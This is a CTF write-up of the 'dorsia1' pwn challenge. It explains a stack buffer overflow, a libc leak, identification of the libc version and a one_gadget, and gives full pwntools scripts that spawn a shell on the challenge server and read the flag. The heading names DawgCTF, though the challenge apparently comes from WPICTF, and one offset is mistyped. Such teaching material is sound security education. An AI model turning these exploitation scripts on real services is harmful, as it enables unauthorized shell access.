# DawgCTF 2020

## dorsia1

> 100
>
> [http://us-east-1.linodeobjects.com/wpictf-challenge-files/dorsia.webm](../dorsia.webm) The first card.
>
> `nc dorsia1.wpictf.xyz 31337 or 31338 or 31339`
>
> made by: awg
> 
> _Hint: Same libc as dorsia4, but you shouldn't need the file to solve._

Tags: _pwn_


### Analysis

#### Roll the film ([dorsia.webm](../dorsia.webm))

![](dorsia1.png)

Quite possibly one of the best movies scenes ever (your results may vary), augmented with _new pwns_.  And ..., there are two verbal hints in the clip: _stack smash_ and _fgets_.

What I most appreciate about this challenge is that this is a legit fuckup.  You could (and can) actually expect someone to mistype the `69` as `96`.

The hint: _Same libc as dorsia4, but you shouldn't need the file to solve_, was actually delivered later in the challenge as users keep asking for the libc version.  I do not fully agree with that.  For starters is this x86_64, x86, arm, or something else?

The `printf` leaks the location of `system` with an offset (`765772`), this can be used to both determine the version of libc as well as the architecture.

Assuming x86_64 (safe bet) _stack smash_ with 69 bytes + 8 bytes for the saved base pointer then an 8 byte address as the new return address.  That leaves 16 bytes left (15 really since `fgets` will only read 68 bytes (one less than size parameter)).  This is important, because it'll tell you what will not work: `pop rdi; ret`, pointer to `/bin/sh`, `system`.  Which is exactly what I tried first (habit, I prefer this over gadgets because it is portable).  That 96th byte will be a NULL (0x00), and unless the remote libc address space starts with `0x00` (and it does not), then this will not work.  Plan B: try a gadget.

However, there is a 2nd, easier solution, and the hint spells that out for you.  `765772`.  What is that number and what does it mean?  It pays to be curious.


### Exploit

#### Attack Plan

1. Leak libc address
2. Find libc version
3. Find a gadget
2. Get the flag


#### Leak libc address

```
#!/usr/bin/env python3

from pwn import *

p = remote('dorsia1.wpictf.xyz',31337)

_ = p.recvline().strip()

system = int(_,16) - 765772
print(hex(system))
```


#### Find libc version

```
import os
stream = os.popen("libc-database/find system " + str(hex(system & 0xFFF)) + " | grep /glibc/ | sed 's/)//' | awk '{print $NF}'")
output = stream.read().strip()
stream.close()

libc = ELF('libc-database/db/' + output + '.so')
baselibc = system - libc.symbols['system']
print("libc:" + str(hex(baselibc)))
print('libc-database/db/' + output + '.so')
```

This code assumes you have the libc-database cloned locally, however there's an online version as well: [https://libc.blukat.me/](https://libc.blukat.me/) (tip from @ins0--thanks!).  Personally I prefer the local version, esp. if searching for gadgets or ROP chains, but it can also take about 30 minutes to download.  Options are good to have.

Running this will output:

```
[+] Opening connection to dorsia1.wpictf.xyz on port 31337: Done
0x783e16412440
[*] '/pwd/datajerk/wpictf2020/dorsia1/libc-database/db/libc6_2.27-3ubuntu1_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
libc:0x783e163c3000
libc-database/db/libc6_2.27-3ubuntu1_amd64.so
```

Now we have the libc version and binary.


#### Find a gadget

```
# one_gadget libc-database/db/libc6_2.27-3ubuntu1_amd64.so

0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

`0x4f322` looks the most promising.


#### Get the flag

```
gadget = 0x4f322

payload  = 69 * b'A'
payload += 8 * b'B'
payload += p64(baselibc + gadget)
payload += (96 - len(payload)) * p8(0)

p.sendline(payload)
p.interactive()
```

Filling the rest of the stack with NULLs is just habit--it can help however with `one_gadget`.

Output:

```
[+] Opening connection to dorsia1.wpictf.xyz on port 31337: Done
0x7386ccfc1440
[*] '/pwd/datajerk/wpictf2020/dorsia1/libc-database/db/libc6_2.27-3ubuntu1_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
libc:0x7386ccf72000
libc-database/db/libc6_2.27-3ubuntu1_amd64.so
[*] Switching to interactive mode
$ cat flag.txt
WPI{FEED_ME_A_STRAY_CAT}
```


#### Flag

```
WPI{FEED_ME_A_STRAY_CAT}
```


### Be curious

```
#!/usr/bin/env python3

from pwn import *

p = remote('dorsia1.wpictf.xyz',31337)

_ = p.recvline().strip()

gadget = int(_,16)

payload  = 69 * b'A'
payload += 8 * b'B'
payload += p64(gadget)
payload += (96 - len(payload)) * p8(0)

p.sendline(payload)
p.interactive()
```

This basically just sends back `system+765722` as the return address in our _stack smash_.

Output:

```
[+] Opening connection to dorsia1.wpictf.xyz on port 31337: Done
[*] Switching to interactive mode
$ cat flag.txt
WPI{FEED_ME_A_STRAY_CAT}
```


#### What is `system+765722`?

Let's find out:

```
# python3
Python 3.7.5 (default, Nov 20 2019, 09:21:52)
[GCC 9.2.1 20191008] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> libc = ELF('libc-database/db/libc6_2.27-3ubuntu1_amd64.so')
[*] '/pwd/datajerk/wpictf2020/dorsia1/libc-database/db/libc6_2.27-3ubuntu1_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
>>> print(hex(libc.symbols['system'] + 765722))
0x10a35a
```

Looking at the `one_gadget` output above it looks pretty close to `0x10a38c`.



